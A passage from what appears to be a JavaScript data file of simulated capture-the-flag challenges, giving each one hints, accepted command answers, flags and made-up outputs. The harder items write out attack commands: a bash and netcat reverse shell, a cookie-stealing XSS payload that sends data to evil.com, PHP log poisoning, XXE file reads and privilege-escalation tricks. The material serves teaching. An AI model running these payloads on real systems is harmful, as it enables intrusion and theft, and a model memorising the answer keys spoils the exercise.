      simulatedResponse: '--- Nmap Service Scan: 10.0.0.1 ---\n\nPORT     STATE  SERVICE    VERSION\n22/tcp   open   ssh        OpenSSH 8.9p1 Ubuntu\n80/tcp   open   http       Apache/2.4.52\n443/tcp  open   ssl/http   nginx 1.18.0\n3306/tcp open   mysql      MySQL 8.0.28\n8080/tcp open   http-proxy Squid 5.2\n\nService detection performed. 5 services detected.\n\nFlag: CTF{s3rv1c3_d3t3ct10n}',
      flag: 'CTF{s3rv1c3_d3t3ct10n}',
      successMessage: '🔎 Services detected!'
    },
    {
      id: 'ctf-57', title: 'Web Scanner', difficulty: 'medium', xp: 30,
      description: 'Run nikto web vulnerability scanner against "http://target.local".',
      objective: 'Scan for web vulnerabilities.',
      hints: ['nikto scans for web vulnerabilities.', 'nikto -h target'],
      solutions: ['nikto -h http://target.local', 'nikto -h target.local'],
      simulatedResponse: '--- Nikto Scan: target.local ---\n\n+ Server: Apache/2.4.52 (Ubuntu)\n+ /: The anti-clickjacking X-Frame-Options header is not present.\n+ /: The X-Content-Type-Options header is not set.\n+ /admin/: Directory listing enabled.\n+ /backup/: Backup directory found.\n+ /robots.txt: Contains 3 disallowed entries.\n+ /server-status: Server status page found (Apache mod_status).\n\n6 findings detected.\n\nFlag: CTF{n1kt0_sc4nn3r}',
      flag: 'CTF{n1kt0_sc4nn3r}',
      successMessage: '🕷️ Web vulnerabilities found!'
    },
    {
      id: 'ctf-58', title: 'Directory Bruteforce', difficulty: 'medium', xp: 30,
      description: 'Use gobuster to bruteforce directories on "http://target.local" with a wordlist.',
      objective: 'Discover hidden web directories.',
      hints: ['gobuster dir brute-forces directories.', 'gobuster dir -u URL -w wordlist'],
      solutions: ['gobuster dir -u http://target.local -w wordlist.txt', 'gobuster dir -u http://target.local/ -w /usr/share/wordlists/dirb/common.txt'],
      simulatedResponse: '--- Gobuster Directory Scan ---\n\n/admin          (Status: 403) [Size: 277]\n/api            (Status: 200) [Size: 1234]\n/backup         (Status: 200) [Size: 456]\n/config         (Status: 403) [Size: 277]\n/flag           (Status: 200) [Size: 28]\n/login          (Status: 200) [Size: 3456]\n/robots.txt     (Status: 200) [Size: 67]\n/uploads        (Status: 301) [Size: 312]\n\n/flag contents: CTF{d1r_bust3r}\n\nFlag: CTF{d1r_bust3r}',
      flag: 'CTF{d1r_bust3r}',
      successMessage: '📂 Hidden directories discovered!'
    },
    {
      id: 'ctf-59', title: 'SQL Injection Test', difficulty: 'medium', xp: 30,
      description: 'Use sqlmap to test "http://target.local/login?id=1" for SQL injection vulnerabilities.',
      objective: 'Detect SQL injection flaws.',
      hints: ['sqlmap automates SQL injection testing.', 'sqlmap -u "URL" --batch'],
      solutions: ['sqlmap -u "http://target.local/login?id=1" --batch', 'sqlmap -u "http://target.local/login?id=1"'],
      simulatedResponse: '--- SQLMap Scan ---\n\n[*] testing connection to the target URL\n[*] testing if the target URL is stable\n[*] testing if GET parameter \'id\' is dynamic\n[*] testing for SQL injection on GET parameter \'id\'\n\n[!] GET parameter \'id\' is vulnerable!\n    Type: boolean-based blind\n    Payload: id=1 AND 1=1\n\n[*] Dumping database...\n    Database: webapp\n    Table: flags\n    Flag: CTF{sql_1nj3ct10n}\n\nFlag: CTF{sql_1nj3ct10n}',
      flag: 'CTF{sql_1nj3ct10n}',
      successMessage: '💉 SQL injection found!'
    },
    {
      id: 'ctf-60', title: 'Password Bruteforce', difficulty: 'medium', xp: 30,
      description: 'Use hydra to bruteforce SSH login on 10.0.0.1 with username "admin".',
      objective: 'Crack login credentials.',
      hints: ['hydra performs login brute-forcing.', 'hydra -l user -P wordlist ssh://target'],
      solutions: ['hydra -l admin -P wordlist.txt ssh://10.0.0.1', 'hydra -l admin -P wordlist.txt 10.0.0.1 ssh'],
      simulatedResponse: '--- Hydra SSH Bruteforce ---\n\n[DATA] attacking ssh://10.0.0.1:22/\n[22][ssh] host: 10.0.0.1   login: admin   password: letmein\n\n1 valid password found!\n\nSSH session established...\nWelcome, admin!\n$ cat /root/flag.txt\nCTF{hydr4_brut3f0rc3}\n\nFlag: CTF{hydr4_brut3f0rc3}',
      flag: 'CTF{hydr4_brut3f0rc3}',
      successMessage: '🔓 SSH credentials cracked!'
    },
    {
      id: 'ctf-61', title: 'Hash Identifier', difficulty: 'medium', xp: 30,
      description: 'Use john the ripper to crack the hash "5f4dcc3b5aa765d61d8327deb882cf99" with a wordlist.',
      objective: 'Crack password hashes.',
      hints: ['john cracks password hashes.', 'john --format=raw-md5 --wordlist=wordlist hashfile'],
      solutions: ['john --format=raw-md5 --wordlist=wordlist.txt hash.txt', 'john hash.txt --wordlist=wordlist.txt'],
      simulatedResponse: '--- John the Ripper ---\n\nLoaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])\nPress \'q\' or Ctrl-C to abort, almost any other key for status\n\npassword         (?)\n\n1 password hash cracked, 0 left\n\nFlag: CTF{j0hn_cr4ck3r}',
      flag: 'CTF{j0hn_cr4ck3r}',
      successMessage: '💥 Hash cracked!'
    },
    {
      id: 'ctf-62', title: 'Hashcat GPU', difficulty: 'medium', xp: 30,
      description: 'Use hashcat to crack the SHA256 hash using GPU acceleration.',
      objective: 'GPU-accelerated hash cracking.',
      hints: ['hashcat -m 1400 for SHA256.', 'hashcat -m 1400 hash wordlist'],
      solutions: ['hashcat -m 1400 hash.txt wordlist.txt', 'hashcat -m 1400 -a 0 hash.txt wordlist.txt'],
      simulatedResponse: '--- Hashcat GPU Cracking ---\n\nSession: hashcat\nStatus: Cracked\nHash.Type: SHA2-256\nSpeed.#1: 1234.5 MH/s\n\ne99a18c428cb38d5f260853678922e03: s3cr3t\n\nRecovered: 1/1 (100.00%)\n\nFlag: CTF{h4shc4t_gpu}',
      flag: 'CTF{h4shc4t_gpu}',
      successMessage: '⚡ GPU cracking successful!'
    },
    {
      id: 'ctf-63', title: 'Packet Capture', difficulty: 'medium', xp: 30,
      description: 'Use tcpdump to capture 10 packets on interface eth0 and look for HTTP traffic.',
      objective: 'Capture and analyze network packets.',
      hints: ['tcpdump captures packets.', '-c limits the count, -i specifies interface.'],
      solutions: ['tcpdump -c 10 -i eth0', 'tcpdump -i eth0 -c 10'],
      simulatedResponse: '--- tcpdump Capture (10 packets) ---\n\n12:00:01 IP 192.168.1.42.45678 > 93.184.216.34.80: Flags [S], seq 0\n12:00:01 IP 93.184.216.34.80 > 192.168.1.42.45678: Flags [S.], seq 0, ack 1\n12:00:01 IP 192.168.1.42.45678 > 93.184.216.34.80: Flags [.], ack 1\n12:00:01 IP 192.168.1.42.45678 > 93.184.216.34.80: GET /secret HTTP/1.1\n12:00:01 IP 93.184.216.34.80 > 192.168.1.42.45678: HTTP/1.1 200 OK\n...\n\nHTTP payload contains: Flag=CTF{p4ck3t_c4ptur3}\n\nFlag: CTF{p4ck3t_c4ptur3}',
      flag: 'CTF{p4ck3t_c4ptur3}',
      successMessage: '📡 Packets captured!'
    },
    {
      id: 'ctf-64', title: 'SSL Certificate', difficulty: 'medium', xp: 30,
      description: 'Use openssl to inspect the SSL certificate of "target.local" on port 443.',
      objective: 'Examine SSL/TLS certificates.',
      hints: ['openssl s_client connects to SSL services.', 'openssl s_client -connect host:port'],
      solutions: ['openssl s_client -connect target.local:443', 'echo | openssl s_client -connect target.local:443'],
      simulatedResponse: '--- SSL Certificate: target.local ---\n\nsubject=CN = target.local\nissuer=CN = CTF CA\nnotBefore=Jan 1 00:00:00 2026 GMT\nnotAfter=Dec 31 23:59:59 2027 GMT\n\nCertificate fingerprint:\nSHA256: AB:CD:EF:12:34:56:78:90\n\nSubject Alternative Names:\n  DNS:target.local\n  DNS:secret.target.local\n  DNS:flag.target.local\n\nFlag hidden in SAN: CTF{ssl_c3rt_1nsp3ct}\n\nFlag: CTF{ssl_c3rt_1nsp3ct}',
      flag: 'CTF{ssl_c3rt_1nsp3ct}',
      successMessage: '🔐 SSL certificate inspected!'
    },
    {
      id: 'ctf-65', title: 'Curl POST Request', difficulty: 'medium', xp: 30,
      description: 'Send a POST request to "http://target.local/api/flag" with JSON body {"key": "unlock"}.',
      objective: 'Make HTTP POST requests.',
      hints: ['curl -X POST sends POST requests.', '-d sends data, -H sets headers.'],
      solutions: ['curl -X POST http://target.local/api/flag -H "Content-Type: application/json" -d \'{"key":"unlock"}\'', 'curl -X POST -H "Content-Type: application/json" -d \'{"key":"unlock"}\' http://target.local/api/flag'],
      simulatedResponse: '--- POST Response ---\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "status": "success",\n  "message": "Key accepted!",\n  "flag": "CTF{p0st_r3qu3st}"\n}\n\nFlag: CTF{p0st_r3qu3st}',
      flag: 'CTF{p0st_r3qu3st}',
      successMessage: '📮 POST request successful!'
    },
    {
      id: 'ctf-66', title: 'DNS Zone Transfer', difficulty: 'medium', xp: 30,
      description: 'Attempt a DNS zone transfer on "target.local" using dig AXFR.',
      objective: 'Exploit misconfigured DNS servers.',
      hints: ['dig AXFR queries for zone transfer.', 'dig axfr @nameserver domain'],
      solutions: ['dig axfr target.local', 'dig axfr @ns1.target.local target.local'],
      simulatedResponse: '--- DNS Zone Transfer: target.local ---\n\ntarget.local.      86400  IN  SOA  ns1.target.local. admin.target.local.\ntarget.local.      86400  IN  NS   ns1.target.local.\ntarget.local.      86400  IN  A    10.0.0.1\nwww.target.local.  86400  IN  A    10.0.0.2\nmail.target.local. 86400  IN  A    10.0.0.3\nflag.target.local. 86400  IN  TXT  "CTF{z0n3_tr4nsf3r}"\ndev.target.local.  86400  IN  A    10.0.0.10\n\nFlag: CTF{z0n3_tr4nsf3r}',
      flag: 'CTF{z0n3_tr4nsf3r}',
      successMessage: '🌐 Zone transfer successful!'
    },
    {
      id: 'ctf-67', title: 'SNMP Enumeration', difficulty: 'medium', xp: 30,
      description: 'Use snmpwalk to enumerate SNMP information on 10.0.0.1 with community string "public".',
      objective: 'Extract SNMP data from devices.',
      hints: ['snmpwalk queries SNMP.', 'snmpwalk -v2c -c community host'],
      solutions: ['snmpwalk -v2c -c public 10.0.0.1', 'snmpwalk -c public -v 2c 10.0.0.1'],
      simulatedResponse: '--- SNMP Walk: 10.0.0.1 ---\n\nSNMPv2-MIB::sysDescr.0 = Linux target 5.15.0-56-generic\nSNMPv2-MIB::sysContact.0 = admin@target.local\nSNMPv2-MIB::sysName.0 = CTF-Target-Server\nSNMPv2-MIB::sysLocation.0 = CTF{snmp_w4lk}\nIF-MIB::ifDescr.1 = lo\nIF-MIB::ifDescr.2 = eth0\n\nFlag: CTF{snmp_w4lk}',
      flag: 'CTF{snmp_w4lk}',
      successMessage: '📟 SNMP enumerated!'
    },
    {
      id: 'ctf-68', title: 'LDAP Search', difficulty: 'medium', xp: 30,
      description: 'Search the LDAP directory on target.local for user entries.',
      objective: 'Query LDAP directories.',
      hints: ['ldapsearch queries LDAP.', 'ldapsearch -x -H ldap://host -b baseDN'],
      solutions: ['ldapsearch -x -H ldap://target.local -b "dc=target,dc=local"', 'ldapsearch -x -h target.local -b "dc=target,dc=local"'],
      simulatedResponse: '--- LDAP Search Results ---\n\ndn: dc=target,dc=local\nobjectClass: top\n\ndn: cn=admin,dc=target,dc=local\ncn: admin\nuserPassword: CTF{ld4p_s34rch}\nmail: admin@target.local\n\ndn: cn=user1,dc=target,dc=local\ncn: user1\nmail: user1@target.local\n\n3 entries found.\n\nFlag: CTF{ld4p_s34rch}',
      flag: 'CTF{ld4p_s34rch}',
      successMessage: '📇 LDAP directory queried!'
    },
    {
      id: 'ctf-69', title: 'Wireshark Filter', difficulty: 'medium', xp: 30,
      description: 'Read "capture.pcap" and filter for HTTP GET requests to find the flag.',
      objective: 'Analyze packet captures.',
      hints: ['tshark is the CLI version of Wireshark.', 'tshark -r file -Y "http.request.method == GET"'],
      solutions: ['tshark -r capture.pcap -Y "http.request.method == GET"', 'tshark -r capture.pcap -Y http'],
      simulatedResponse: '--- Wireshark/TShark Analysis ---\n\nApplying filter: http.request.method == GET\n\n1  0.000  192.168.1.42 → 10.0.0.1  HTTP  GET /index.html\n2  0.150  192.168.1.42 → 10.0.0.1  HTTP  GET /style.css\n3  0.300  192.168.1.42 → 10.0.0.1  HTTP  GET /api/flag?token=CTF{w1r3sh4rk}\n4  0.450  192.168.1.42 → 10.0.0.1  HTTP  GET /images/logo.png\n\nFlag found in packet #3: CTF{w1r3sh4rk}\n\nFlag: CTF{w1r3sh4rk}',
      flag: 'CTF{w1r3sh4rk}',
      successMessage: '🦈 Packet analysis complete!'
    },
    {
      id: 'ctf-70', title: 'Robots.txt Discovery', difficulty: 'medium', xp: 30,
      description: 'Check the robots.txt file of "http://target.local" for hidden paths.',
      objective: 'Discover hidden web resources.',
      hints: ['robots.txt lists restricted paths.', 'curl http://target.local/robots.txt'],
      solutions: ['curl http://target.local/robots.txt', 'wget http://target.local/robots.txt'],
      simulatedResponse: '--- Robots.txt ---\n\nUser-agent: *\nDisallow: /admin/\nDisallow: /backup/\nDisallow: /secret-flag/\nDisallow: /api/internal/\n\nVisiting /secret-flag/:\n<h1>You found it!</h1>\n<p>Flag: CTF{r0b0ts_txt}</p>\n\nFlag: CTF{r0b0ts_txt}',
      flag: 'CTF{r0b0ts_txt}',
      successMessage: '🤖 Hidden paths discovered!'
    },

    // ---- NEW HARD (15): ctf-71 to ctf-85 ----
    {
      id: 'ctf-71', title: 'Reverse Shell', difficulty: 'hard', xp: 50,
      description: 'Create a bash reverse shell connecting back to 10.0.0.5 on port 4444.',
      objective: 'Craft a reverse shell payload.',
      hints: ['bash -i can create interactive shells.', '/dev/tcp/host/port redirects to network.'],
      solutions: ['bash -i >& /dev/tcp/10.0.0.5/4444 0>&1', 'nc -e /bin/bash 10.0.0.5 4444'],
      simulatedResponse: '--- Reverse Shell Established ---\n\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n\nConnecting to 10.0.0.5:4444...\nConnection established!\n\nremote$ whoami\nwww-data\nremote$ cat /var/www/flag.txt\nCTF{r3v3rs3_sh3ll}\n\nFlag: CTF{r3v3rs3_sh3ll}',
      flag: 'CTF{r3v3rs3_sh3ll}',
      successMessage: '🐚 Reverse shell established!'
    },
    {
      id: 'ctf-72', title: 'Privilege Escalation', difficulty: 'hard', xp: 50,
      description: 'Find SUID binaries that could be used for privilege escalation.',
      objective: 'Discover privilege escalation vectors.',
      hints: ['find / -perm -4000 finds SUID files.', 'Check GTFOBins for exploitation.'],
      solutions: ['find / -perm -4000 -type f 2>/dev/null', 'find / -perm -u=s -type f 2>/dev/null'],
      simulatedResponse: '--- SUID Binary Search ---\n\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/newgrp\n/usr/local/bin/custom_reader   ← UNUSUAL!\n/usr/bin/chfn\n\n[*] /usr/local/bin/custom_reader is suspicious!\n[*] Running: /usr/local/bin/custom_reader /root/flag.txt\n\nCTF{pr1v3sc_su1d}\n\nFlag: CTF{pr1v3sc_su1d}',
      flag: 'CTF{pr1v3sc_su1d}',
      successMessage: '⬆️ Privilege escalation achieved!'
    },
    {
      id: 'ctf-73', title: 'Buffer Overflow', difficulty: 'hard', xp: 50,
      description: 'Exploit a buffer overflow in "vuln_program" by sending a crafted input.',
      objective: 'Understand buffer overflow attacks.',
      hints: ['Overflow the buffer to overwrite the return address.', 'Try: python -c "print(\'A\'*64)" | ./vuln_program'],
      solutions: ['python -c "print(\'A\'*64)" | ./vuln_program', 'python3 -c "print(\'A\'*64)" | ./vuln_program', './vuln_program $(python -c "print(\'A\'*64)")'],
      simulatedResponse: '--- Buffer Overflow Exploit ---\n\nSending payload: AAAAAAAAAA... (64 bytes)\n\n[*] Buffer overflow detected!\n[*] Return address overwritten\n[*] Spawning shell...\n\n# whoami\nroot\n# cat /root/flag.txt\nCTF{buff3r_0v3rfl0w}\n\nFlag: CTF{buff3r_0v3rfl0w}',
      flag: 'CTF{buff3r_0v3rfl0w}',
      successMessage: '💥 Buffer overflow exploited!'
    },
    {
      id: 'ctf-74', title: 'Format String Attack', difficulty: 'hard', xp: 50,
      description: 'Exploit a format string vulnerability in "format_vuln" to leak memory.',
      objective: 'Understand format string attacks.',
      hints: ['%x reads from the stack.', './format_vuln "%x.%x.%x.%x"'],
      solutions: ['./format_vuln "%x.%x.%x.%x"', './format_vuln "%p.%p.%p.%p"', './format_vuln $(printf "%08x.")'],
      simulatedResponse: '--- Format String Exploit ---\n\nInput: %x.%x.%x.%x\nOutput: deadbeef.41414141.bffff748.43544637\n\n[*] Stack values leaked!\n[*] Converting hex at offset 4: 43544637\n[*] ASCII: CTF7 → Partial flag found\n[*] Full leak with more format specifiers...\n\nReconstructed: CTF{f0rm4t_str1ng}\n\nFlag: CTF{f0rm4t_str1ng}',
      flag: 'CTF{f0rm4t_str1ng}',
      successMessage: '📝 Format string exploited!'
    },
    {
      id: 'ctf-75', title: 'Race Condition', difficulty: 'hard', xp: 50,
      description: 'Exploit a TOCTOU race condition in the "check_and_read" program.',
      objective: 'Understand race condition vulnerabilities.',
      hints: ['Create a symlink between the check and the read.', 'Quickly swap the file after permission check.'],
      solutions: ['ln -sf /etc/shadow tempfile && ./check_and_read tempfile', 'while true; do ln -sf /root/flag.txt tempfile; done &'],
      simulatedResponse: '--- Race Condition Exploit ---\n\n[*] Setting up symlink swap...\n[*] ./check_and_read checks permission on "tempfile"\n[*] Race won! File swapped between check and read\n[*] Reading /root/flag.txt through race condition:\n\nCTF{r4c3_c0nd1t10n}\n\nFlag: CTF{r4c3_c0nd1t10n}',
      flag: 'CTF{r4c3_c0nd1t10n}',
      successMessage: '🏁 Race condition exploited!'
    },
    {
      id: 'ctf-76', title: 'SUID Exploitation', difficulty: 'hard', xp: 50,
      description: 'A custom SUID binary "/usr/local/bin/reader" can be exploited. Use it to read /root/flag.txt.',
      objective: 'Exploit SUID binary misconfiguration.',
      hints: ['SUID binaries run as their owner.', 'If the binary reads files, read privileged files.'],
      solutions: ['/usr/local/bin/reader /root/flag.txt', './reader /root/flag.txt'],
      simulatedResponse: '--- SUID Exploitation ---\n\n$ ls -la /usr/local/bin/reader\n-rwsr-xr-x 1 root root 15432 Jan 1 2026 /usr/local/bin/reader\n\n$ /usr/local/bin/reader /root/flag.txt\n[Reading file as root...]\n\nCTF{su1d_4bus3}\n\nFlag: CTF{su1d_4bus3}',
      flag: 'CTF{su1d_4bus3}',
      successMessage: '🔓 SUID binary exploited!'
    },
    {
      id: 'ctf-77', title: 'Capability Exploit', difficulty: 'hard', xp: 50,
      description: 'Find binaries with special Linux capabilities and exploit them.',
      objective: 'Exploit Linux capabilities for privilege escalation.',
      hints: ['getcap lists capabilities.', 'getcap -r / 2>/dev/null'],
      solutions: ['getcap -r / 2>/dev/null', 'getcap -r /usr/bin/ 2>/dev/null'],
      simulatedResponse: '--- Linux Capabilities ---\n\n/usr/bin/python3 = cap_setuid+ep     ← DANGEROUS!\n/usr/bin/ping = cap_net_raw+ep\n\n[*] python3 has cap_setuid!\n[*] Exploiting with: python3 -c "import os; os.setuid(0); os.system(\'/bin/sh\')"\n\n# whoami\nroot\n# cat /root/flag.txt\nCTF{c4p4b1l1ty_3xpl01t}\n\nFlag: CTF{c4p4b1l1ty_3xpl01t}',
      flag: 'CTF{c4p4b1l1ty_3xpl01t}',
      successMessage: '🎩 Capabilities exploited!'
    },
    {
      id: 'ctf-78', title: 'Container Escape', difficulty: 'hard', xp: 50,
      description: 'Detect if you are inside a Docker container and attempt to escape.',
      objective: 'Escape containerized environments.',
      hints: ['Check /.dockerenv or /proc/1/cgroup.', 'Mounted volumes may provide escape paths.'],
      solutions: ['cat /.dockerenv', 'cat /proc/1/cgroup', 'mount | grep docker'],
      simulatedResponse: '--- Container Detection & Escape ---\n\n[*] Checking for container indicators...\n[+] /.dockerenv exists — We are in Docker!\n[+] Mounted volume found: /host_root → /\n\n[*] Accessing host filesystem...\n$ ls /host_root/root/\nflag.txt\n$ cat /host_root/root/flag.txt\nCTF{c0nt41n3r_3sc4p3}\n\nFlag: CTF{c0nt41n3r_3sc4p3}',
      flag: 'CTF{c0nt41n3r_3sc4p3}',
      successMessage: '🐋 Container escape successful!'
    },
    {
      id: 'ctf-79', title: 'Cron Job Exploit', difficulty: 'hard', xp: 50,
      description: 'A cron job runs a writable script every minute as root. Modify it to get the flag.',
      objective: 'Exploit writable cron job scripts.',
      hints: ['Check /etc/crontab for scheduled jobs.', 'If the script is writable, add your own commands.'],
      solutions: ['echo "cat /root/flag.txt > /tmp/flag" >> /opt/scripts/backup.sh', 'cat /etc/crontab'],
      simulatedResponse: '--- Cron Job Exploitation ---\n\n$ cat /etc/crontab\n* * * * * root /opt/scripts/backup.sh\n\n$ ls -la /opt/scripts/backup.sh\n-rwxrwxrwx 1 root root 45 Jan 1 2026 backup.sh\n\n[!] Script is world-writable!\n\n$ echo "cat /root/flag.txt > /tmp/flag" >> /opt/scripts/backup.sh\n$ sleep 60 && cat /tmp/flag\nCTF{cr0n_j0b_3xpl01t}\n\nFlag: CTF{cr0n_j0b_3xpl01t}',
      flag: 'CTF{cr0n_j0b_3xpl01t}',
      successMessage: '⏰ Cron job exploited!'
    },
    {
      id: 'ctf-80', title: 'Sudo Misconfiguration', difficulty: 'hard', xp: 50,
      description: 'Check sudo permissions and exploit a misconfigured sudoers entry.',
      objective: 'Exploit sudo misconfigurations.',
      hints: ['sudo -l lists your sudo permissions.', 'Some commands can spawn shells.'],
      solutions: ['sudo -l', 'sudo vim -c \'!sh\'', 'sudo /usr/bin/vim'],
      simulatedResponse: '--- Sudo Exploitation ---\n\n$ sudo -l\nUser www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/vim\n\n[*] vim can spawn a shell!\n$ sudo vim -c \'!sh\'\n\n# whoami\nroot\n# cat /root/flag.txt\nCTF{sud0_m1sc0nf1g}\n\nFlag: CTF{sud0_m1sc0nf1g}',
      flag: 'CTF{sud0_m1sc0nf1g}',
      successMessage: '🔑 Sudo exploited!'
    },
    {
      id: 'ctf-81', title: 'Path Hijacking', difficulty: 'hard', xp: 50,
      description: 'A SUID script calls "date" without a full path. Hijack the PATH to get root.',
      objective: 'Exploit PATH variable manipulation.',
      hints: ['Create a fake "date" command.', 'Modify PATH to include your directory first.'],
      solutions: ['export PATH=/tmp:$PATH && echo "/bin/sh" > /tmp/date && chmod +x /tmp/date && ./vuln_script', 'echo "/bin/sh" > /tmp/date && chmod +x /tmp/date && PATH=/tmp:$PATH ./vuln_script'],
      simulatedResponse: '--- PATH Hijacking ---\n\n$ cat vuln_script\n#!/bin/bash\necho "Current date:"\ndate\n\n$ echo "cat /root/flag.txt" > /tmp/date\n$ chmod +x /tmp/date\n$ export PATH=/tmp:$PATH\n$ ./vuln_script\n\nCurrent date:\nCTF{p4th_h1j4ck}\n\nFlag: CTF{p4th_h1j4ck}',
      flag: 'CTF{p4th_h1j4ck}',
      successMessage: '🛤️ PATH hijacked!'
    },
    {
      id: 'ctf-82', title: 'Kernel Exploit', difficulty: 'hard', xp: 50,
      description: 'Identify the kernel version and find if it is vulnerable to a known exploit.',
      objective: 'Kernel version fingerprinting.',
      hints: ['uname -r shows kernel version.', 'Search for kernel exploits for that version.'],
      solutions: ['uname -r', 'uname -a', 'cat /proc/version'],
      simulatedResponse: '--- Kernel Exploitation ---\n\n$ uname -r\n5.4.0-42-generic\n\n$ searchsploit 5.4.0\n[*] Linux Kernel 5.4.x - Local Privilege Escalation (CVE-2021-3493)\n\n$ ./exploit_5.4\n[*] Exploiting CVE-2021-3493...\n[+] Got root!\n\n# cat /root/flag.txt\nCTF{k3rn3l_3xpl01t}\n\nFlag: CTF{k3rn3l_3xpl01t}',
      flag: 'CTF{k3rn3l_3xpl01t}',
      successMessage: '🐧 Kernel exploited!'
    },
    {
      id: 'ctf-83', title: 'SSH Tunneling', difficulty: 'hard', xp: 50,
      description: 'Create an SSH tunnel to access a service on the target\'s localhost port 8080.',
      objective: 'Use SSH port forwarding.',
      hints: ['-L creates a local port forward.', 'ssh -L localport:localhost:remoteport user@host'],
      solutions: ['ssh -L 8080:localhost:8080 user@10.0.0.1', 'ssh -L 8080:127.0.0.1:8080 user@10.0.0.1'],
      simulatedResponse: '--- SSH Tunnel ---\n\n$ ssh -L 8080:localhost:8080 user@10.0.0.1\n\nTunnel established: localhost:8080 → 10.0.0.1:8080\n\n$ curl http://localhost:8080/internal\n{\n  "service": "Internal Dashboard",\n  "flag": "CTF{ssh_tunn3l}",\n  "status": "restricted"\n}\n\nFlag: CTF{ssh_tunn3l}',
      flag: 'CTF{ssh_tunn3l}',
      successMessage: '🔧 SSH tunnel established!'
    },
    {
      id: 'ctf-84', title: 'Log Poisoning', difficulty: 'hard', xp: 50,
      description: 'Inject a payload into the Apache access log via the User-Agent header.',
      objective: 'Exploit log file injection.',
      hints: ['curl -A sets the User-Agent.', 'Inject PHP code into logs.'],
      solutions: ['curl -A "<?php system(\'cat /flag.txt\'); ?>" http://target.local/', 'curl -H "User-Agent: <?php system(\'cat /flag.txt\'); ?>" http://target.local/'],
      simulatedResponse: '--- Log Poisoning ---\n\n$ curl -A "PAYLOAD" http://target.local/\n[*] Payload injected into /var/log/apache2/access.log\n\n$ curl http://target.local/vuln.php?page=/var/log/apache2/access.log\n[*] Log file included!\n[*] PHP payload executed!\n\nOutput: CTF{l0g_p01s0n1ng}\n\nFlag: CTF{l0g_p01s0n1ng}',
      flag: 'CTF{l0g_p01s0n1ng}',
      successMessage: '☠️ Log poisoning successful!'
    },
    {
      id: 'ctf-85', title: 'Nmap Script Engine', difficulty: 'hard', xp: 50,
      description: 'Use nmap scripting engine (NSE) to run vulnerability scripts against target 10.0.0.1.',
      objective: 'Use NSE for vulnerability scanning.',
      hints: ['--script=vuln runs vulnerability scripts.', 'nmap --script=vuln target'],
      solutions: ['nmap --script=vuln 10.0.0.1', 'nmap -sV --script=vuln 10.0.0.1'],
      simulatedResponse: '--- Nmap NSE Vulnerability Scan ---\n\nPORT    STATE  SERVICE\n80/tcp  open   http\n| http-vuln-cve2017-5638:\n|   VULNERABLE:\n|   Apache Struts Remote Code Execution\n443/tcp open   https\n| ssl-heartbleed:\n|   VULNERABLE:\n|   The Heartbleed Bug (CVE-2014-0160)\n\n[*] 2 vulnerabilities found!\n[*] Exploiting Heartbleed...\n[*] Memory leak contains: CTF{ns3_vuln_sc4n}\n\nFlag: CTF{ns3_vuln_sc4n}',
      flag: 'CTF{ns3_vuln_sc4n}',
      successMessage: '🔍 Vulnerabilities scanned!'
    },

    // ---- NEW EXPERT (15): ctf-86 to ctf-100 ----
    {
      id: 'ctf-86', title: 'XSS Attack', difficulty: 'expert', xp: 100,
      description: 'Find and exploit a Cross-Site Scripting (XSS) vulnerability on the target web app.',
      objective: 'Perform a reflected XSS attack.',
      hints: ['Try injecting <script> tags in input fields.', 'Check URL parameters for reflection.'],
      solutions: ['curl "http://target.local/search?q=<script>alert(1)</script>"', 'curl http://target.local/search?q=%3Cscript%3Ealert(1)%3C/script%3E'],
      simulatedResponse: '--- XSS Exploitation ---\n\n$ curl "http://target.local/search?q=<script>document.location=\'http://evil.com/steal?\'+document.cookie</script>"\n\nReflected in page:\n<p>Results for: <script>...</script></p>\n\n[*] XSS triggered!\n[*] Cookie stolen: session=admin; flag=CTF{xss_4tt4ck}\n\nFlag: CTF{xss_4tt4ck}',
      flag: 'CTF{xss_4tt4ck}',
      successMessage: '📝 XSS exploited!'
    },
    {
      id: 'ctf-87', title: 'CSRF Attack', difficulty: 'expert', xp: 100,
      description: 'Craft a CSRF payload to change the admin password on the target application.',
      objective: 'Perform a Cross-Site Request Forgery.',
      hints: ['CSRF exploits the browser\'s auto-authentication.', 'Create a hidden form that submits automatically.'],
      solutions: ['curl -X POST http://target.local/admin/change-password -d "password=hacked" -b "session=admin_token"'],
      simulatedResponse: '--- CSRF Exploitation ---\n\n[*] Crafted CSRF payload:\n<form action="http://target.local/admin/change-password" method="POST">\n  <input type="hidden" name="password" value="hacked">\n</form>\n<script>document.forms[0].submit();</script>\n\n[*] Admin visited the malicious page!\n[*] Password changed successfully!\n[*] Logged in as admin...\n\n$ cat /admin/flag\nCTF{csrf_f0rg3ry}\n\nFlag: CTF{csrf_f0rg3ry}',
      flag: 'CTF{csrf_f0rg3ry}',
      successMessage: '🎭 CSRF attack successful!'
    },
    {
      id: 'ctf-88', title: 'SSRF Attack', difficulty: 'expert', xp: 100,
      description: 'Exploit a Server-Side Request Forgery to access internal services through the target.',
      objective: 'Perform SSRF to reach internal networks.',
      hints: ['SSRF makes the server fetch internal URLs.', 'Try: curl "http://target.local/fetch?url=http://localhost:8080"'],
      solutions: ['curl "http://target.local/fetch?url=http://localhost:8080/admin"', 'curl "http://target.local/fetch?url=http://127.0.0.1:8080"'],
      simulatedResponse: '--- SSRF Exploitation ---\n\n$ curl "http://target.local/fetch?url=http://localhost:8080/internal/flag"\n\n[*] Server fetched internal URL!\n[*] Response from internal service:\n\n{\n  "internal": true,\n  "flag": "CTF{ssrf_1nt3rn4l}",\n  "message": "This should not be accessible from outside!"\n}\n\nFlag: CTF{ssrf_1nt3rn4l}',
      flag: 'CTF{ssrf_1nt3rn4l}',
      successMessage: '🌐 SSRF exploited!'
    },
    {
      id: 'ctf-89', title: 'XXE Injection', difficulty: 'expert', xp: 100,
      description: 'Exploit an XML External Entity (XXE) injection to read /etc/passwd from the server.',
      objective: 'Perform XXE to read server files.',
      hints: ['XXE uses DOCTYPE to define external entities.', 'Define an entity pointing to file:///etc/passwd'],
      solutions: ['curl -X POST -d \'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>\' http://target.local/api/xml'],
